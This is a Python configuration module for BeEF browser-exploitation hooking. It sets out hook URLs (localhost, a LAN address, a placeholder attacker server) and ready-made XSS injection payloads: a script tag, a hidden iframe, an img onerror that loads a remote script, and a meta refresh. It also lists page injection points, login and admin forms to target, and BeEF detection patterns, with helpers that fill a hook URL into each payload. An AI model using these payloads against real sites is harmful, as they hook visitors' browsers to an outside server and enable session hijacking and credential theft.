BEEF_CONFIG = {
    "default_hook_url": "http://localhost:3000/hook.js",
    "alternative_hooks": [
        "http://192.168.1.100:3000/hook.js",
        "http://beef.local:3000/hook.js",
        "https://your-beef-server.com/hook.js"
    ],
    "payloads": {
        "hook": '<script src="{hook_url}"></script>',
        "alert": '<script>alert("XSS Test");</script>',
        "console": '<script>console.log("Injection successful");</script>',
        "iframe": '<iframe src="{hook_url}" style="display:none;"></iframe>',
        "img": '<img src="x" onerror="document.createElement(\'script\').src=\'{hook_url}\'">',
        "link": '<link rel="stylesheet" href="{hook_url}">',
        "meta": '<meta http-equiv="refresh" content="0;url={hook_url}">'
    },
    "injection_points": [
        "</head>",
        "</body>",
        "<head>",
        "<body>"
    ],
    "detection_patterns": [
        r'beef\.js',
        r'hook\.js',
        r'localhost:3000',
        r'beef_hook',
        r'beef\.local'
    ],
    "form_targets": [
        "login",
        "admin",
        "user",
        "register",
        "contact",
        "search"
    ]
}

def get_beef_hook_url(custom_url=None):
    if custom_url:
        return custom_url
    return BEEF_CONFIG["default_hook_url"]

def get_payload(payload_type, hook_url):
    payload_template = BEEF_CONFIG["payloads"].get(payload_type, BEEF_CONFIG["payloads"]["hook"])
    return payload_template.format(hook_url=hook_url)

def get_injection_points():
    return BEEF_CONFIG["injection_points"]

def get_detection_patterns():
    return BEEF_CONFIG["detection_patterns"] 